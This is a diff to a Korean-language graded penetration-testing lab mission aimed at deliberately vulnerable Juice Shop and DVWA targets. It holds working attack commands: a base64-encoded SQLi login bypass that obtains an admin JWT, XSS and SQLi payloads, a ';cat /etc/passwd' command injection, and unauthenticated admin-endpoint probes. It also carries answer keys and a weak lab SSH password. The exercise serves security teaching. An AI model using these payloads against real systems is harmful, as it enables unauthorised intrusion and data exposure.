@@ -8,8 +8,8 @@ description: |
   끝까지 수행한다: ① 정찰(nuclei 기술/보안헤더 자동 매핑) → ② 인증 우회(로그인 SQLi → 관리자 JWT →
   payload 디코드) → ③ 주입(SQLi/XSS/RCE 를 차단 모드 DVWA 에 보내 WAF 942/941/932 차단 확인) →
   ④ 접근제어(무인증 관리 엔드포인트 + 강제 브라우징 /ftp = A01) → ⑤ 위험 평가(발견을 CVSS 3.1 로
-  정량화) → ⑥ 전문 보고(Executive Summary→발견(CVSS/PoC)→권고). 모든 명령은 el34
-  호스트(ssh ccc@{{TARGET_IP}})에서 실행하며(컨테이너 작업은 docker exec -it el34-attacker bash 접속), 인가된 표적 vhost
+  정량화) → ⑥ 전문 보고(Executive Summary→발견(CVSS/PoC)→권고). 공격은 외부 공격자 VM 192.168.0.202(att/1)에서
+  공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행한다. 인가된 표적 vhost
   (juice.el34.lab / dvwa.el34.lab) 만 점검한다. "취약점을 찾았다"가 아니라 재현 가능한 증거로 보고한다.
 difficulty: hard
 duration_minutes: 200
@@ -32,18 +32,18 @@ steps:
       없어 보이는 것)가 무의미하므로, 점검자는 본격 점검 전에 항상 도달성부터 확인한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) juice vhost 도달 확인 — Host로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로(점검 가능 상태 검증)
-      curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/
+      curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://192.168.0.161/
       ```
       ## 🔧 도구·옵션 풀이
       - `curl` — 명령줄 HTTP 요청 도구. `-H 'Host: juice.el34.lab'` 로 어느 vhost(표적)인지 지정한다
         (el34 web 의 Apache 가 Host 헤더로 라우팅).
       - `-o /dev/null -w '%{http_code}'` — 본문은 버리고 **응답 코드만** 출력하는 관용구.
       - `-sk` — 진행 표시 끄기(`-s`) + 자체서명 인증서 허용(`-k`).
-      - `http://10.20.30.1/` — fw 의 ext 게이트웨이. 요청은 fw → ips → web 경로로 흐른다.
+      - `http://192.168.0.161/` — fw 의 ext 게이트웨이. 요청은 fw → ips → web 경로로 흐른다.
       ## ✅ 합격 기준
       `juice` 출력 시 통과. **근거:** `juice=<코드>` 가 나타나면 fw→web 경로로 표적에 도달해 점검 가능
       상태(scope alive) — 응답이 없으면 Host 헤더·게이트웨이 주소부터 재확인한다.
@@ -52,7 +52,7 @@ steps:
     points: 8
     answer: |
       # 1) juice vhost 도달 확인 — Host로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로(점검 가능 상태 검증)
-      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
+      ssh att@192.168.0.202 "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://192.168.0.161/"
     answer_detail: "기말 종합 침투 점검의 표적 = JuiceShop(juice.el34.lab, 인증/접근제어용 탐지 모드) +
       DVWA(dvwa.el34.lab, 주입 차단 시연용). 이 미션은 fw→web 경로로 표적에 HTTP 응답 코드가 돌아오는지
       확인해 점검 가능 상태(scope alive)를 검증한다. 'juice' 가 출력에 보이면 도달."
@@ -76,18 +76,18 @@ steps:
       지도를 그리는 단계다. 손으로 하나씩 보는 대신 자동 스캐너로 빠르게 다건을 매핑해 속도를 얻는다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) nuclei로 기술 핑거프린팅(tech-detect) + 보안 헤더 누락 템플릿을 함께 던져 표면 자동 매핑(임시파일에 저장→앞 8줄 표시)
       # 2) 저장한 결과 줄 수를 세어 nuclei_findings= 로 출력(발견 건수), 임시파일 정리
-      nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt
+      nuclei -u http://192.168.0.161 -H 'Host: juice.el34.lab' -t ~/nuclei-templates/http/technologies/tech-detect.yaml -t ~/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt
       # 3) 해석 — 기술 핑거프린팅 + 보안 헤더 누락이 다건 매핑됨(자동 정찰)
       echo "→ 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)"
       ```
       ## 🔧 도구·옵션 풀이
       - `nuclei` — YAML 템플릿 기반 자동 점검 스캐너. "이런 요청 → 이런 응답이면 이 약점/기술"이라는
-        규칙을 템플릿으로 표적에 던진다. 템플릿은 attacker 의 `/root/nuclei-templates/` 아래에 있다.
+        규칙을 템플릿으로 표적에 던진다. 템플릿은 attacker 의 `~/nuclei-templates/` 아래에 있다.
       - `-t .../technologies/tech-detect.yaml` — **기술 핑거프린팅**(표적이 무슨 서버·프레임워크인지).
       - `-t .../misconfiguration/http-missing-security-headers.yaml` — **보안 헤더 누락**(CSP·HSTS 등 미적용 탐지).
       - `tee /tmp/wv15n.txt | head -8` 로 결과를 저장하며 앞 8줄만 보이고, `wc -l` 로 발견 건수를 센다.
@@ -100,21 +100,21 @@ steps:
     answer: |
       # 1) nuclei로 기술 핑거프린팅(tech-detect) + 보안 헤더 누락 템플릿을 함께 던져 표면 자동 매핑(임시파일에 저장→앞 8줄 표시)
       # 2) 저장한 결과 줄 수를 세어 nuclei_findings= 로 출력(발견 건수), 임시파일 정리
-      docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=\$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt"
+      ssh att@192.168.0.202 "nuclei -u http://192.168.0.161 -H 'Host: juice.el34.lab' -t ~/nuclei-templates/http/technologies/tech-detect.yaml -t ~/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=\$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt"
       # 3) 해석 — 기술 핑거프린팅 + 보안 헤더 누락이 다건 매핑됨(자동 정찰)
       echo "→ 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)"
     answer_detail: "정찰 = nuclei 의 기술 핑거프린팅 + 보안 헤더 누락 템플릿으로 표면을 자동 다건 매핑.
       출력 줄 수(nuclei_findings)가 발견 건수다. 자동(속도) 정찰의 결과는 보고서의 Low~Medium 발견이자
       이후 수동(정밀) 점검의 입력이 된다. 'nuclei_findings=' 표식이 출력되면 정찰 수행 인정."
     expected_output: |
-      [tech-detect:google-font-api] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:strict-transport-security] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:content-security-policy] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:permissions-policy] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:referrer-policy] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.20.30.1
-      [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.20.30.1
+      [tech-detect:google-font-api] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:content-security-policy] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:permissions-policy] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:referrer-policy] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.0.161
+      [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.0.161
       nuclei_findings
     verify:
       type: output_contains
@@ -135,11 +135,11 @@ steps:
       인증 우회(OWASP A07). 성공하면 서버가 JWT(서명된 로그인 토큰)를 발급한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) SQLi 우회 페이로드({"email":"' OR 1=1--",...})를 base64 디코드해 임시 JSON 저장 → juice 로그인 API에 POST → 응답 앞 120자(authentication=우회 성공), 임시파일 정리
-      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv15.json
+      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv15.json
       echo ""
       ```
       ## 🔧 도구·옵션 풀이
@@ -156,7 +156,7 @@ steps:
     points: 12
     answer: |
       # 1) SQLi 우회 페이로드({"email":"' OR 1=1--",...})를 base64 디코드해 임시 JSON 저장 → juice 로그인 API에 POST → 응답 앞 120자(authentication=우회 성공), 임시파일 정리
-      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv15.json'
+      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv15.json'
       echo ""
     answer_detail: "인증 우회 = 로그인 API 이메일 자리에 ' OR 1=1-- 를 주입 → 조건이 항상 참이 되어
       관리자 JWT 발급(OWASP A07 식별·인증 실패). 응답에 'authentication'(토큰 구조)이 보이면 우회 성공.
@@ -182,12 +182,12 @@ steps:
       에 민감 정보를 담으면 그 자체가 정보 노출(A02)이다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON 저장 → 로그인 응답에서 token 추출(sed) → 가운데 칸(payload)만 잘라(cut) base64url→base64 치환(tr) 후 디코드(앞 200자)
       echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json
-      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')
+      T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://192.168.0.161/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')
       echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv15.json
       echo ""
       ```
@@ -205,7 +205,7 @@ steps:
     points: 10
     answer: |
       # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON 저장 → 로그인 응답에서 token 추출(sed) → 가운데 칸(payload)만 잘라(cut) base64url→base64 치환(tr) 후 디코드(앞 200자)
-      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv15.json'
+      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://192.168.0.161/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv15.json'
       echo ""
     answer_detail: "JWT 의 가운데 조각(payload)을 base64url→base64 변환 후 디코드하면 email 등이 평문
       노출된다 — payload 는 암호화가 아니라 인코딩일 뿐이므로 서명 검증과 무관하게 누구나 읽는다.
@@ -232,13 +232,13 @@ steps:
       (ModSecurity CRS)가 어떻게 막는지(403)를 직접 본다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) SQLi(?id=1' OR '1'='1, %27='/%20=공백)를 차단 모드 dvwa에 전송 → sqli= 응답코드(CRS 942 차단)
-      curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20OR%20%271%27=%271"
+      curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20OR%20%271%27=%271"
       # 2) 이어서 XSS(?q=<script>alert(1)</script>)도 전송 → xss= 응답코드(CRS 941 차단)
-      curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E"
+      curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?q=%3Cscript%3Ealert(1)%3C/script%3E"
       # 3) 해석 — dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403(차단은 보완, 근본은 입력검증)
       echo "→ dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403"
       ```
@@ -256,7 +256,7 @@ steps:
     answer: |
       # 1) SQLi(?id=1' OR '1'='1, %27='/%20=공백)를 차단 모드 dvwa에 전송 → sqli= 응답코드(CRS 942 차단)
       # 2) 이어서 XSS(?q=<script>alert(1)</script>)도 전송 → xss= 응답코드(CRS 941 차단)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
       # 3) 해석 — dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403(차단은 보완, 근본은 입력검증)
       echo "→ dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403"
     answer_detail: "주입(A03) = SQLi(CRS 942)·XSS(CRS 941) 페이로드를 차단 모드 DVWA 에 전송 → WAF 가
@@ -284,11 +284,11 @@ steps:
       심각한 주입 결과다. 여기서도 차단 모드 DVWA 로 보내 WAF 차단을 확인한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 명령주입(?q=1;cat /etc/passwd, %20=공백) — ; 로 OS 명령 연결, 차단 모드 dvwa에 전송 → rce= 응답코드(CRS 932 차단)
-      curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'
+      curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?q=1;cat%20/etc/passwd'
       # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 탐지, 성공 시 완전 장악(최고 심각도)
       echo "→ ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)"
       ```
@@ -305,7 +305,7 @@ steps:
     points: 12
     answer: |
       # 1) 명령주입(?q=1;cat /etc/passwd, %20=공백) — ; 로 OS 명령 연결, 차단 모드 dvwa에 전송 → rce= 응답코드(CRS 932 차단)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?q=1;cat%20/etc/passwd'"
       # 2) 해석 — ;cmd = OS 명령 연결, ModSec 932(RCE) 탐지, 성공 시 완전 장악(최고 심각도)
       echo "→ ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)"
     answer_detail: "RCE = 명령주입(;cmd 로 OS 명령 연결). 차단 모드 DVWA 에서 ModSec CRS 932(RCE) 룰군이
@@ -333,13 +333,13 @@ steps:
       Access Control, 2021 Top 10 1 위). 강제 브라우징은 링크에 없는 경로(`/ftp`)를 직접 호출하는 점검이다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 인증 토큰 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → admincfg= 응답코드(200=무인증 노출 A01)
-      curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration
+      curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://192.168.0.161/rest/admin/application-configuration
       # 2) 이어서 링크에 없는 /ftp를 직접 호출(강제 브라우징) → ftp= 응답코드
-      curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp
+      curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://192.168.0.161/ftp
       # 3) 해석 — admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
       echo "→ admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01"
       ```
@@ -357,7 +357,7 @@ steps:
     answer: |
       # 1) 인증 토큰 없이 관리 엔드포인트(/rest/admin/application-configuration) 호출 → admincfg= 응답코드(200=무인증 노출 A01)
       # 2) 이어서 링크에 없는 /ftp를 직접 호출(강제 브라우징) → ftp= 응답코드
-      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
+      ssh att@192.168.0.202 "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://192.168.0.161/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://192.168.0.161/ftp"
       # 3) 해석 — admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01
       echo "→ admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01"
     answer_detail: "접근제어 실패(OWASP A01) = 인증 없이 관리 엔드포인트(/rest/admin/application-
